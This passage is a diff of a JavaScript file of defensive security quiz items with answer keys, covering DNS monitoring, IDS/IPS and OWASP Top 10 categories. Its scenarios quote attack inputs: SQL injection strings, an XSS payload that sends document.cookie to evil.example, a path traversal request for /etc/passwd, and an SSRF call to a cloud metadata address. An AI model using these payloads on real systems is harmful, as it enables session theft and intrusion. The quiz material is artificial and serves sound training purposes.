+        "question": "Your organization logs DNS only at the internal recursive resolver. Some endpoints begin resolving names through an external DNS-over-HTTPS (DoH) provider. What is the security impact and best response?",
         "options": [
           {
-            "label": "DoH encrypts DNS inside port 443 HTTPS, so those lookups bypass your logging; force clients to the internal resolver and detect external DoH.",
+            "label": "DoH wraps DNS inside port 443 HTTPS, so those lookups bypass your resolver's logs; force clients back to the internal, logged resolver.",
             "value": "a"
           },
           {
-            "label": "DoH improves your visibility because encrypted lookups are automatically decrypted and stored in full by the internal recursive resolver.",
+            "label": "DoH runs on its own dedicated port 853, so the firewall still records every lookup and no DNS visibility is lost.",
             "value": "b"
           },
           {
-            "label": "DoH has no monitoring impact since all DNS queries, encrypted or not, are still recorded centrally by the root name servers.",
+            "label": "Your internal recursive resolver still receives the DoH lookups as forwarded queries, so the DNS logs stay complete.",
             "value": "c"
           },
           {
-            "label": "DoH only affects DNSSEC signature validation, so the correct fix is to disable DNSSEC on the internal resolver entirely.",
+            "label": "Only DNSSEC-signed domains are affected by this, so disabling DNSSEC on the internal resolver restores full logging.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Correct: DoH wraps DNS in ordinary HTTPS on port 443, so those lookups no longer reach your internal resolver's logs; the standard response is to force clients onto the internal logged resolver and detect or block external DoH. The claim that DoH improves visibility is wrong: the internal resolver never sees externally-resolved DoH queries, so it cannot decrypt or store them. The claim that root servers record all queries is wrong: root servers do not log every organization's client queries. Disabling DNSSEC is wrong: DoH is about privacy/encryption, not DNSSEC validation, and disabling DNSSEC would only remove integrity protection."
+        "explanation": "Correct: DoH carries DNS inside ordinary HTTPS on port 443, so an external DoH provider resolves those names and your internal resolver never sees them; the standard response is to force clients onto the internal logged resolver and detect or block external DoH. The port 853 option confuses DoH with DoT — 853 is DoT's dedicated port, whereas DoH deliberately blends into 443 web traffic. The forwarded-queries option is wrong: an external DoH provider answers the client directly, so the internal resolver has nothing to log. Disabling DNSSEC does nothing here: DoH is about encryption/privacy, not DNSSEC integrity, and removing DNSSEC would only drop forgery protection."
       },
       {
-        "question": "During an investigation you need to know which server actually holds the authoritative records for a suspicious domain, not just which server your workstation asked first. Which server in the resolution chain holds that definitive answer?",
+        "question": "During an investigation you need the definitive source for a suspicious domain's A record — the server that actually stores it, not merely the first server your workstation happened to ask. Which server in the resolution chain is that?",
         "options": [
           {
-            "label": "The recursive resolver, because it is the only server a client ever directly communicates with during a lookup.",
+            "label": "The recursive resolver, since it is the server the client talks to directly and it returns the final answer it assembled.",
             "value": "a"
           },
           {
-            "label": "The root server, because every DNS query in the world is answered directly and completely by one of the 13 root servers.",
+            "label": "A root name server, since resolution begins there and the root can point you toward the domain's real records.",
             "value": "b"
           },
           {
-            "label": "The authoritative name server for that domain, because it is the definitive source the recursive resolver ultimately queries and trusts.",
+            "label": "The authoritative name server for the domain — the definitive source the recursive resolver ultimately queries and trusts.",
             "value": "c"
           },
           {
-            "label": "The TLD server for .com, because top-level domain servers store the full record set for every domain underneath them.",
+            "label": "The .com TLD server, since it delegates the domain and keeps a copy of the records its authoritative servers hand out.",
             "value": "d"
           }
         ],
         "answer": "c",
-        "explanation": "Correct: the authoritative name server is the definitive source that actually holds a domain's real records; the recursive resolver walks root -> TLD -> authoritative to reach it. The recursive resolver answer is wrong: the recursive resolver only relays the client's question, it does not hold the definitive record itself. The root server answer is wrong: root servers only point to the correct TLD servers, they never answer with the final IP. The .com TLD server answer is wrong: TLD servers only delegate to the authoritative servers, they do not store each domain's full record set."
+        "explanation": "Correct: the authoritative name server is the definitive source that actually holds the domain's real records; the recursive resolver walks root -> TLD -> authoritative to reach it. The recursive-resolver option describes the server the client talks to, but it only relays and caches the answer rather than owning the record. The root-server option is wrong: the root only delegates to the correct TLD servers and never holds a domain's A record. The TLD-server option is a common misconception: the .com TLD delegates to the domain's authoritative servers via NS records but does not store the A records themselves."
       },
       {
-        "question": "During a hunt you notice one domain name resolving to a new set of several different IP addresses roughly every 90 seconds over many hours, with a DNS TTL of 60 seconds on every answer. What does this most likely represent, and which MITRE ATT&CK sub-technique fits?",
+        "question": "During a hunt you notice one domain name resolving to a new set of several different IP addresses — scattered across unrelated networks and countries — roughly every 90 seconds over many hours, with a DNS TTL of 60 seconds on every answer. What does this most likely represent, and which MITRE ATT&CK sub-technique fits?",
         "options": [
           {
-            "label": "Fast-flux DNS, MITRE ATT&CK T1568.001 (Dynamic Resolution: Fast Flux DNS), used to keep malicious infrastructure resilient against IP-based blocking.",
+            "label": "Fast-flux DNS (MITRE ATT&CK T1568.001): malicious infrastructure rotating through many IPs behind a tiny TTL to resist IP-based blocking.",
             "value": "a"
           },
           {
-            "label": "DNS cache poisoning, because any TTL value under 300 seconds is itself proof that a forged response was injected into the resolver's cache.",
+            "label": "Legitimate CDN load balancing, which also returns rotating IPs on a short TTL to steer each user to the nearest edge node.",
             "value": "b"
           },
           {
-            "label": "A domain generation algorithm (DGA) failing to resolve, since malware using DGA logic always produces this exact rotating-IP pattern.",
+            "label": "A domain generation algorithm beaconing, since DGA malware cycles a single domain through many IPs until its C2 answers.",
             "value": "c"
           },
           {
-            "label": "A misconfigured SOA record, since the Minimum field controls negative-caching TTL and low values always indicate a broken zone file.",
+            "label": "DNS cache poisoning, where a forged response injected this rotating set of IPs into the recursive resolver's cache.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Correct: one domain resolving successfully, repeatedly, to a constantly rotating set of IPs with a very short TTL is the textbook fast-flux signature, mapped to T1568.001, and used to make IP blocklisting ineffective against C2 or phishing infrastructure. The cache-poisoning option is wrong: a low TTL alone is common in many legitimate services (including fast-flux abuse) and is not proof of cache poisoning, which is about a forged single answer winning a race, not a domain's normal TTL setting. The DGA option is wrong: DGA produces many different domain names mostly failing with NXDOMAIN, the opposite shape of one domain resolving successfully to many IPs. The misconfigured-SOA option is wrong: the SOA Minimum field governs negative caching of NXDOMAIN answers for the zone, not the TTL on individual A record answers for a resolving domain."
+        "explanation": "Correct: one domain resolving successfully, over and over, to a constantly rotating set of IPs spread across unrelated networks with a very short TTL is the textbook fast-flux signature (T1568.001), used to make IP blocklisting ineffective against C2 or phishing infrastructure. The CDN option is the real near-miss — CDNs also rotate IPs on short TTLs — but a CDN's addresses sit inside one provider's own netblocks, not scattered across unrelated networks and countries. The DGA option describes the opposite shape: many different domain names mostly failing with NXDOMAIN, not one domain resolving to many IPs. The cache-poisoning option is wrong: poisoning forces a single forged answer to win a race, it does not produce a domain's steady low-TTL IP rotation."
       },
       {
         "question": "An authoritative name server for your organization receives an inbound AXFR request over TCP port 53 from an external IP that is not one of your configured secondary servers. What is happening, and what should a correctly configured server do?",
         "options": [
           {
-            "label": "It is an attempted full zone transfer — reconnaissance to dump every record in the zone; a hardened server answers REFUSED and permits AXFR only from authorized secondaries.",
+            "label": "An attempted full zone transfer — reconnaissance to dump the whole zone; a hardened server answers REFUSED and allows AXFR only from authorized secondaries.",
             "value": "a"
           },
           {
-            "label": "It is a routine DNSSEC key rotation, and the server should return the DNSKEY record to complete it.",
+            "label": "A routine incremental transfer (IXFR) from a secondary after a serial bump, so the server should send only the changed records.",
             "value": "b"
           },
           {
-            "label": "It is normal UDP caching behavior that requires no action because zone transfers never touch external hosts.",
+            "label": "A legitimate secondary whose IP recently changed — the server should update its allow-list and complete the transfer.",
             "value": "c"
           },
           {
-            "label": "It is a fast-flux update, so the server should lower its TTL to under 60 seconds in response.",
+            "label": "A DNS amplification attempt, so the correct response is to rate-limit the source rather than refuse the request.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "AXFR is a full zone transfer. If allowed from anyone, it hands an attacker the entire zone (every hostname, service, and IP) in one request, so it is a classic recon technique. A properly configured server restricts AXFR to authorized secondaries and answers everyone else with REFUSED (RCODE 5)."
+        "explanation": "AXFR is a full zone transfer. Allowed from anyone, it hands an attacker the entire zone — every hostname, service, and IP — in one request, so an unexpected AXFR from a non-secondary is classic recon; a hardened server restricts AXFR to authorized secondaries and answers everyone else with REFUSED (RCODE 5). The IXFR option is wrong twice over: the request is AXFR (full), not IXFR, and it comes from an unauthorized external host. The changed-IP secondary option is the tempting misread — you do not simply allow an unverified external IP; you refuse until the secondary is confirmed and re-authorized. The amplification option misfits: AXFR runs over TCP, not the spoofable UDP that amplification abuses, so rate-limiting is not the right control here."
       }
     ],
     "references": [
@@ -2611,116 +2611,116 @@ const NEW_TOPIC_LESSONS = [
         "question": "Your team wants a sensor that can actively drop a known exploit attempt before it reaches an internal server, not merely alert on it after the fact. Which deployment meets that requirement, and what trade-off comes with it?",
         "options": [
           {
-            "label": "An IDS fed by a SPAN port, since mirrored traffic lets it reset malicious connections while staying safely off the forwarding path.",
+            "label": "An IDS fed by a SPAN port, since mirrored traffic lets it reset malicious connections while staying off the forwarding path.",
             "value": "a"
           },
           {
-            "label": "An inline IPS, which sits in the traffic path and can drop packets in real time but becomes a point of latency or failure.",
+            "label": "An inline IPS, which sits in the traffic path and can drop packets in real time but adds latency and a failure point.",
             "value": "b"
           },
           {
-            "label": "An out-of-band IDS connected via a hardware tap, because taps duplicate traffic fast enough to block the original packets.",
+            "label": "An out-of-band IDS on a hardware tap, because taps never drop frames and so can hold back the original packets.",
             "value": "c"
           },
           {
-            "label": "A perimeter firewall alone, since stateful firewalls inspect application payloads and block exploits without any dedicated sensor.",
+            "label": "A perimeter firewall alone, since stateful firewalls track connections and so can drop exploit payloads by signature.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Correct: only an inline IPS sits in the forwarding path and can drop malicious packets in real time, with the trade-off that being inline adds latency and a potential failure/availability risk. The SPAN-port IDS option is wrong: an IDS on a SPAN port only sees copies and cannot stop the originals. The hardware-tap IDS option is wrong: a tap also delivers only a copy to an out-of-band IDS, which cannot block. The perimeter-firewall-alone option is wrong: a traditional firewall filters by rules and state but is not designed to detect and drop specific exploit signatures the way an IPS does."
+        "explanation": "Only an inline IPS sits in the forwarding path, so only it can drop a packet before delivery; the price is that every packet now depends on it, adding latency and a point of failure. \"An IDS fed by a SPAN port\" is wrong: a SPAN port hands the IDS a copy, and the original has already been delivered by the time it alerts. \"An out-of-band IDS on a hardware tap\" is wrong: a tap is more reliable than SPAN, but it still only delivers a copy, so the IDS cannot hold back the original. \"A perimeter firewall alone\" is wrong: tracking connection state is not the same as matching exploit signatures in the payload, which is the IPS's job."
       },
       {
-        "question": "A newly deployed IPS with default rules is generating many alerts, and some are blocking legitimate business traffic. What is the appropriate way to handle this situation?",
+        "question": "On its first day in blocking mode, a new IPS rule set starts dropping some of the payroll application's legitimate traffic. Which response follows the tuning practice described in the lesson?",
         "options": [
           {
-            "label": "Disable the IPS entirely and replace it with an out-of-band IDS, because inline devices are inherently unsuitable for production.",
+            "label": "Switch the IPS to fail-closed, so a misbehaving rule set stops all traffic visibly instead of dropping some of it.",
             "value": "a"
           },
           {
-            "label": "Ignore the blocked-traffic reports, since any traffic an IPS drops is by definition malicious and safe to discard.",
+            "label": "Move the misfiring rules to anomaly-based detection, since a baseline of payroll traffic will stop it being flagged.",
             "value": "b"
           },
           {
-            "label": "Tune the sensor by refining or disabling misfiring rules and adding known-good exceptions, ideally running new blocks in alert-only mode first.",
+            "label": "Refine the misfiring rules, add a known-good exception for payroll, and run new blocks in alert-only mode first.",
             "value": "c"
           },
           {
-            "label": "Switch every rule to anomaly-based detection, which eliminates false positives because baselines never flag legitimate activity.",
+            "label": "Keep the rules but change their action to rate-limit, so payroll traffic is throttled instead of fully dropped.",
             "value": "d"
           }
         ],
         "answer": "c",
-        "explanation": "Correct: tuning — refining or disabling rules that misfire, adding exceptions for known-good sources, and validating new blocking rules in alert-only mode before enforcing — reduces false positives while preserving real detections. Disabling the IPS for an out-of-band IDS is wrong: inline IPS is standard in production; the fix is tuning, not abandonment. Ignoring the blocked-traffic reports is wrong: an IPS can absolutely block legitimate traffic on a false positive, so those reports must be investigated. Switching every rule to anomaly-based detection is wrong: anomaly detection actually tends to produce *more* false positives, not fewer, since unusual is not the same as malicious."
+        "explanation": "This is a false-positive problem, and the lesson's answer is tuning: refine or disable the rules that misfire, add exceptions for known-good sources, and validate new blocking rules in alert-only mode before enforcing them. \"Switch the IPS to fail-closed\" is wrong: fail-open vs fail-closed only decides what happens when the sensor itself fails; it does nothing about a rule that matches legitimate traffic. \"Move the misfiring rules to anomaly-based detection\" is wrong: anomaly detection usually produces more false positives, because unusual is not the same as malicious. \"Change their action to rate-limit\" is wrong: legitimate payroll traffic would still be throttled by a rule that should not match it at all."
       },
       {
-        "question": "An IDS alert references a Suricata rule with msg 'POSSIBLE SMB EternalBlue Exploit Attempt' and reference cve,2017-0144. What should an analyst do first with this information?",
+        "question": "An IDS alert references a Suricata rule with msg 'POSSIBLE SMB EternalBlue Exploit Attempt' and reference cve,2017-0144, aimed at an internal server on port 445. What should the analyst do first?",
         "options": [
           {
-            "label": "Ignore the reference field since CVE numbers are only relevant to patch management teams, not to alert triage.",
+            "label": "Block the source IP at the perimeter firewall right away, and review the matched traffic later if time allows.",
             "value": "a"
           },
           {
-            "label": "Check the CVE and content match to confirm the traffic fits the known exploit before deciding true or false positive.",
+            "label": "Compare the captured traffic with the rule's content match and CVE reference to judge true or false positive.",
             "value": "b"
           },
           {
-            "label": "Assume the alert is automatically a false positive, since signature-based rules never reference real, published vulnerabilities.",
+            "label": "Treat the target as compromised, because a signature match on port 445 shows the exploit already succeeded.",
             "value": "c"
           },
           {
-            "label": "Disable the rule immediately, because any rule mentioning a specific CVE is guaranteed to generate excessive noise.",
+            "label": "Start with the rule's classtype and sid fields, since those describe which byte pattern matched and why.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Correct: the msg, content match, and CVE reference tell you exactly what pattern was matched and why, so the right first step is confirming the actual traffic really fits that known exploit before ruling on true or false positive. Ignoring the reference field is wrong: the CVE reference is precisely the triage context an analyst needs. Assuming an automatic false positive is wrong: signature rules routinely and usefully reference real published CVEs. Disabling the rule immediately is wrong: referencing a CVE does not make a rule noisy; disabling it without investigation could hide real EternalBlue attempts."
+        "explanation": "The lesson's triage order starts with reading the rule and confirming the match: the msg, content and CVE reference say exactly what pattern fired, so the first step is checking that the captured traffic really fits that exploit before calling it a true or false positive. \"Block the source IP ... right away\" is wrong: it acts before you know whether the alert is real, and an IDS alert is evidence to verify, not a verdict. \"Treat the target as compromised\" is wrong: the rule says \"Exploit Attempt\"; a match shows the pattern crossed the wire, not that the exploit worked on the target. \"Start with the rule's classtype and sid fields\" is wrong: classtype is a reporting category and sid/rev only identify the rule version; the pattern and its rationale are in content and reference."
       },
       {
-        "question": "An organization runs both a network-based IDS at the perimeter and an EDR agent on every workstation. During an investigation, the perimeter sensor shows nothing unusual for a compromised laptop, but the EDR agent shows a suspicious process spawning from a document. What does this best illustrate?",
+        "question": "An organization runs a network IDS at the perimeter and an EDR agent on every workstation. For a laptop under investigation, the perimeter sensor recorded nothing unusual, but EDR shows a suspicious process spawning from a document. What is the best interpretation?",
         "options": [
           {
-            "label": "The EDR alert must be a false positive, since a real compromise would always also be visible to the network-based sensor.",
+            "label": "The EDR detection is probably a false positive, because a real compromise would most likely show up at the perimeter sensor too.",
             "value": "a"
           },
           {
-            "label": "NIDS and HIDS/EDR see different evidence (network traffic vs. host-internal activity), so an attack can be invisible to one family of sensor while a host-based agent still catches it.",
+            "label": "The two sensor families watch different evidence: a document spawning a process is host activity a network sensor never sees.",
             "value": "b"
           },
           {
-            "label": "The perimeter IDS should be reconfigured as an IPS, because only inline devices are capable of detecting process-level activity on a workstation.",
+            "label": "The perimeter sensor should be moved inline as an IPS, since inline placement gives it visibility into process activity.",
             "value": "c"
           },
           {
-            "label": "EDR and NIDS always show identical evidence, so this scenario indicates a misconfiguration in one of the two tools.",
+            "label": "The perimeter sensor's SPAN feed most likely dropped packets under load, which is why it has no record for this laptop.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Correct: NIDS watches traffic crossing a chokepoint while HIDS/EDR watches what happens on the host itself — activity that never generates unusual network traffic (or that occurs after decryption, or entirely locally) is exactly the kind of thing only host-based visibility catches, which is why the lesson stresses corroborating both families. Dismissing the EDR alert as a false positive is wrong: a quiet network sensor does not disprove a real host-level compromise. Reconfiguring the IDS as an IPS is wrong: inline vs out-of-band is about blocking ability, not about seeing host-internal process activity, which no network sensor can observe regardless of placement. Claiming EDR and NIDS always show identical evidence is wrong: the two families are expected to see different things by design, not identical evidence."
+        "explanation": "A NIDS sees traffic crossing its chokepoint; EDR (the descendant of HIDS) sees what runs on the host. A process spawning from a document happens inside the operating system, so network silence is expected, which is why the lesson says to corroborate across both families. \"The EDR detection is probably a false positive\" is wrong: a quiet network sensor does not disprove host-level evidence. \"Moved inline as an IPS\" is wrong: inline vs out-of-band changes whether the sensor can block, not what it can see; no network position shows process creation. \"SPAN feed most likely dropped packets\" is wrong: SPAN drops are real, but even a perfect feed would not show a process tree, so drops do not explain the gap."
       },
       {
-        "question": "After tuning, your NIDS stays silent about a laptop that EDR later confirms was compromised through a fragmented, encoded exploit. In detection-quality terms, what did the NIDS produce, and why is it the most dangerous outcome?",
+        "question": "In one week a tuned NIDS produced three results: (1) an alert on a nightly backup job's unusually large transfer; (2) no alert while a fragmented, encoded exploit reached a laptop that EDR later confirmed was compromised; (3) an alert on a host confirmed to be scanning the network. Which statement correctly labels the most dangerous of these outcomes?",
         "options": [
           {
-            "label": "A false negative: the sensor called malicious traffic benign, so no alert fired at all, which is why network silence should be corroborated with host-based EDR evidence.",
+            "label": "Result 2 is a false negative; no alert fired, so only the host-based EDR evidence exposed the attack.",
             "value": "a"
           },
           {
-            "label": "A false positive: the sensor blocked legitimate traffic, wasting analyst time during triage.",
+            "label": "Result 1 is a false negative; the backup was benign yet the sensor alerted, wasting analyst time.",
             "value": "b"
           },
           {
-            "label": "A true negative: the traffic was benign, so the sensor correctly stayed quiet and no action was needed.",
+            "label": "Result 2 is a true negative; the sensor stayed quiet, so the traffic it inspected was benign.",
             "value": "c"
           },
           {
-            "label": "A true positive: the sensor caught the attack and dropped it inline before it reached the host.",
+            "label": "Result 1 is a false positive, and it is the worst outcome because noise buries real alerts.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "When a sensor labels genuinely malicious traffic as benign, it produces a false negative: no alert fires, so nobody investigates. That silent miss is the most dangerous outcome, and it is exactly why network-sensor silence should be corroborated with host-based (EDR) telemetry that fragmentation and encoding evasions cannot defeat."
+        "explanation": "Result 2 is malicious traffic the sensor treated as benign, which is a false negative. It is the most dangerous outcome because nobody is alerted at all; here only the EDR on the host caught it, which is why the lesson says to corroborate network silence with host evidence. \"Result 1 is a false negative\" is wrong: an alert on benign traffic is a false positive, not a false negative. \"Result 2 is a true negative\" is wrong: a true negative needs the traffic to really be benign, and EDR confirmed a compromise; fragmentation and encoding are evasion techniques that make a sensor miss real attacks. \"Result 1 is a false positive, and it is the worst outcome\" labels result 1 correctly, but alert fatigue is a cost, not the worst outcome; a silent miss is worse."
       }
     ],
     "references": [
@@ -2795,27 +2795,27 @@ const NEW_TOPIC_LESSONS = [
         "question": "You are reviewing web server logs and notice one external IP sending dozens of requests where the query string contains strings like ' OR '1'='1 and UNION SELECT, several of which returned HTTP 500 errors. Which OWASP Top 10 2021 category best describes this activity?",
         "options": [
           {
-            "label": "A02 Cryptographic Failures, because the attacker is trying to break the site's TLS encryption to read data.",
+            "label": "A02 Cryptographic Failures, because the attacker is trying to weaken the site's TLS to read data.",
             "value": "a"
           },
           {
-            "label": "A03 Injection, because untrusted input is being crafted so the database interprets it as SQL commands.",
+            "label": "A03 Injection, because crafted input is being sent so the database runs it as SQL commands.",
             "value": "b"
           },
           {
-            "label": "A07 Authentication Failures, because the attacker is guessing many different account passwords.",
+            "label": "A07 Authentication Failures, because the attacker is guessing many account passwords.",
             "value": "c"
           },
           {
-            "label": "A10 Server-Side Request Forgery, because the server is being forced to reach an attacker-chosen URL.",
+            "label": "A01 Broken Access Control, because the attacker is requesting records they do not own.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "The ' OR '1'='1 and UNION SELECT payloads are classic SQL injection, which falls under A03 Injection: untrusted input is interpreted as database code. The 500 errors suggest the backend is choking on malformed queries. A02 is wrong because nothing here targets TLS or encryption. A07 is wrong because these are injection payloads, not password guessing across accounts. A10 is wrong because SSRF involves forcing the server to make outbound requests, not sending SQL in a query string."
+        "explanation": "' OR '1'='1 and UNION SELECT are SQL injection payloads, which fall under A03 Injection: untrusted input is read as database code instead of data, and clustered 500 errors are the backend choking on the malformed queries. \"A02 Cryptographic Failures\" is wrong: nothing in a query string touches TLS. \"A07 Authentication Failures\" is wrong: password guessing shows up as repeated POST /login with 401 responses, not SQL keywords in parameters. \"A01 Broken Access Control\" is wrong: that pattern is one session walking other users' IDs (IDOR), not SQL syntax in the request."
       },
       {
-        "question": "Your incident review finds that a breach went undetected for four months because the application never logged failed authorization checks and no one monitored the logs it did produce. Which category most directly names this weakness, and why does it matter to a SOC?",
+        "question": "Your incident review finds that a breach went undetected for four months because the application never logged failed authorization checks and no one monitored the logs it did produce. Which category most directly names this weakness?",
         "options": [
           {
             "label": "A05 Security Misconfiguration, since default settings were left unchanged on the web server.",
@@ -2826,108 +2826,108 @@ const NEW_TOPIC_LESSONS = [
             "value": "b"
           },
           {
-            "label": "A09 Security Logging and Monitoring Failures, since missing logs and review let the breach stay hidden.",
+            "label": "A09 Security Logging and Monitoring Failures, since missing logs and review hid the breach.",
             "value": "c"
           },
           {
-            "label": "A06 Vulnerable and Outdated Components, since an unpatched library gave the attacker their foothold.",
+            "label": "A06 Vulnerable and Outdated Components, since an unpatched library gave the attacker a foothold.",
             "value": "d"
           }
         ],
         "answer": "c",
-        "explanation": "Missing authorization logging plus no monitoring is exactly A09 Security Logging and Monitoring Failures, which OWASP added because most breaches are found by outsiders due to this gap; it directly increases dwell time. A05 concerns insecure configuration, not absent logging. A01 describes the access break itself, but the question asks about why it stayed hidden. A06 concerns outdated components, which is not what the scenario describes."
+        "explanation": "Security events that are never logged, or logged but never reviewed, are exactly A09 Security Logging and Monitoring Failures, and this is the gap that lets a breach stay hidden for months. \"A05 Security Misconfiguration\" is wrong: the scenario says nothing about default settings; the problem is absent logging and review. \"A01 Broken Access Control\" is wrong here: it may describe how the attacker got in, but the question asks why the breach stayed hidden. \"A06 Vulnerable and Outdated Components\" is wrong: no outdated library is described."
       },
       {
-        "question": "A web server begins making outbound requests to 169.254.169.254 shortly after receiving a POST request whose body includes a url parameter pointing to that same address, submitted through a public 'link preview' feature. Which OWASP category and consequence does this best match?",
+        "question": "A web server begins making outbound requests to 169.254.169.254 shortly after receiving a POST whose body includes a url parameter pointing to that address, submitted through a public 'link preview' feature. Which OWASP 2021 category does this best match?",
         "options": [
           {
-            "label": "A10 SSRF, because the server was tricked into requesting the cloud metadata service and could leak its own temporary credentials.",
+            "label": "A10 SSRF: the server was steered into requesting the cloud metadata service and could return its own credentials.",
             "value": "a"
           },
           {
-            "label": "A04 Insecure Design, because rate limiting on the preview feature was never implemented for this specific endpoint.",
+            "label": "A04 Insecure Design: the preview feature has no rate limit, so one client can make it send unlimited requests.",
             "value": "b"
           },
           {
-            "label": "A02 Cryptographic Failures, because the metadata address is only reachable when TLS has been misconfigured.",
+            "label": "A05 Security Misconfiguration: the metadata service was left exposed to the internet with its default settings.",
             "value": "c"
           },
           {
-            "label": "A08 Integrity Failures, because the link preview feature pulled an unsigned software update from that address.",
+            "label": "A08 Integrity Failures: the preview feature fetched content from that address without checking its signature.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Forcing a server-side feature to request 169.254.169.254, the cloud metadata service, so it returns the server's own credentials is the textbook A10 SSRF pattern described in this lesson. The Insecure Design option is wrong because the issue is the server making an attacker-chosen request, not a missing rate limit. The Cryptographic Failures option is wrong because TLS configuration is unrelated to reaching a link-local metadata address. The Integrity Failures option is wrong because nothing here involves an unsigned update or CI/CD pipeline, which is what A08 covers."
+        "explanation": "A server-side feature that fetches an attacker-chosen URL, here 169.254.169.254, the cloud metadata address, is the A10 SSRF pattern: the server requests its own temporary cloud credentials on the attacker's behalf. \"A04 Insecure Design\" is wrong: a missing rate limit is not the problem; one request was enough. \"A05 Security Misconfiguration\" is wrong: the metadata address is link-local and was reached from the server itself, not from the internet; that is what makes it SSRF. \"A08 Integrity Failures\" is wrong: A08 is about trusting unsigned updates or compromised pipelines, not a server fetching a URL a user supplied."
       },
       {
-        "question": "A `500 Internal Server Error` response body accidentally includes a full stack trace revealing internal file paths and a database connection string. Under the OWASP Top 10:2025 categorization, which new category was introduced specifically to cover this kind of information leak triggered by an error or edge case?",
+        "question": "During an incident, a payment service's fraud-check dependency started timing out. Logs show the checkout code approved every transaction while the check was unavailable. Under the OWASP Top 10:2025 list, which category best fits this behaviour?",
         "options": [
           {
-            "label": "A10:2025 Mishandling of Exceptional Conditions, the new category covering apps that leak information or misbehave when an error or edge case occurs.",
+            "label": "A10:2025 Mishandling of Exceptional Conditions, because the app failed 'open' when an error occurred.",
             "value": "a"
           },
           {
-            "label": "A03:2025 Software Supply Chain Failures, since any 500 error implies a compromised dependency was used to build the application.",
+            "label": "A03:2025 Software Supply Chain Failures, because the fraud check is a third-party dependency.",
             "value": "b"
           },
           {
-            "label": "A02:2025 Security Misconfiguration, because stack traces can only ever be caused by a misconfigured web server, never by application code.",
+            "label": "A02:2025 Security Misconfiguration, because the dependency's timeout value was set too low.",
             "value": "c"
           },
           {
-            "label": "This scenario has no corresponding OWASP category in either the 2021 or 2025 editions and would not be reported by a SOC analyst.",
+            "label": "A07:2025 Authentication Failures, because payments were approved without checking the user.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Correct: A10:2025 Mishandling of Exceptional Conditions is the new category added specifically for apps that leak sensitive data or enter an insecure state when handling errors, exceptions, or edge cases — exactly this stack-trace leak. The supply-chain option is wrong: supply chain failures concern compromised dependencies or build pipelines, not error-handling leaks. The Security Misconfiguration option is wrong: misconfiguration is a plausible contributing cause in some cases but the category built specifically for error/exception leakage is A10:2025, not A02. The 'no OWASP category' option is wrong: this is a well-recognized, newly named OWASP category, not an unclassified gap."
+        "explanation": "A10:2025 Mishandling of Exceptional Conditions is the new 2025 category for apps that enter an insecure state when an error, exception or edge case occurs; the lesson's own example is a payment flow that fails 'open' and approves the transaction when a validation service times out. \"A03:2025 Software Supply Chain Failures\" is wrong: that category is about compromised dependencies or build pipelines, and nothing here was compromised. The service simply became unavailable. \"A02:2025 Security Misconfiguration\" is wrong: a timeout setting might make the error happen more often, but the weakness is what the code does when the error happens. \"A07:2025 Authentication Failures\" is wrong: the user's login is not in question; the fraud check on the transaction was skipped."
       },
       {
-        "question": "A comment field accepts the value <script>fetch('https://evil.example/steal?c='+document.cookie)</script>, which the application later renders to other visitors' browsers. Which OWASP 2021 category is this, and what is the direct impact?",
+        "question": "A comment field accepts the value <script>fetch('https://evil.example/steal?c='+document.cookie)</script>, which the application saves and later renders to other visitors' browsers. Which type of cross-site scripting (A03 Injection) is this, and what is the impact?",
         "options": [
           {
-            "label": "A03 Injection (specifically stored cross-site scripting): the script runs in other users’ browsers and can steal their session cookies.",
+            "label": "Stored XSS: saved on the server, it runs in the browser of every visitor who views the comment and sends out their cookie.",
             "value": "a"
           },
           {
-            "label": "A02 Cryptographic Failures, because the attacker is decrypting stored user cookies at rest on the server.",
+            "label": "Reflected XSS: it runs only for a victim who clicks a crafted link carrying the script, so other visitors are unaffected.",
             "value": "b"
           },
           {
-            "label": "A06 Vulnerable and Outdated Components, because only an outdated framework could ever render a comment field.",
+            "label": "DOM-based XSS: the server never handles the script; each visitor's browser builds it from the page's URL fragment.",
             "value": "c"
           },
           {
-            "label": "A09 Logging Failures, because the comment was written into the application log file.",
+            "label": "SQL injection: the database interprets the script text as a query when the comment row is saved to the table.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "A script injected into a field that is later rendered to other users is stored cross-site scripting, which lives under A03 Injection: untrusted input is treated as executable code (here, JavaScript running in a victim’s browser) instead of data, letting it exfiltrate the victim’s session cookie. The Cryptographic Failures option is wrong because nothing is decrypted — the cookie is simply read by injected script. The 'outdated components' option is wrong because any templating that fails to output-encode is vulnerable, not only outdated ones. The Logging Failures option is wrong because the harm is script execution in browsers, not a log write."
+        "explanation": "The script was saved on the server and is shown to everyone who views the page, which is stored XSS. It runs in each victim's own session and can send their cookie to the attacker. \"Reflected XSS\" is wrong: reflected XSS is bounced back from a crafted link the victim clicks, but here the payload sits in a saved comment that reaches every visitor. \"DOM-based XSS\" is wrong: in DOM-based XSS the unsafe handling happens in the browser's own JavaScript, but this payload went through the server and was stored. \"SQL injection\" is wrong: the payload is JavaScript aimed at browsers, not SQL syntax aimed at the database."
       },
       {
-        "question": "A web server receives GET /download?file=../../../../etc/passwd and returns 200 with the contents of a system password file. Which category and sub-technique does this match, and what signal should you hunt for?",
+        "question": "A web server receives GET /download?file=../../../../etc/passwd and returns 200 with the contents of /etc/passwd. Which technique is this, and what signal should you hunt for across the logs?",
         "options": [
           {
-            "label": "A01 Broken Access Control via path traversal (CWE-22): hunt for ../ and its encodings (..%2f, %2e%2e) inside file or path parameters.",
+            "label": "A01 path traversal (CWE-22): hunt for ../ and its encodings (..%2f, %2e%2e) inside file and path parameters.",
             "value": "a"
           },
           {
-            "label": "A05 Security Misconfiguration, because returning any file always means directory listing was left enabled on the server.",
+            "label": "A03 OS command injection: hunt for parameters that chain shell commands to read files such as /etc/passwd.",
             "value": "b"
           },
           {
-            "label": "A10 SSRF, because the server made an outbound request to an internal address to read the file.",
+            "label": "A01 forced browsing: hunt for requests to unlinked admin pages that return 200 when they should return 403.",
             "value": "c"
           },
           {
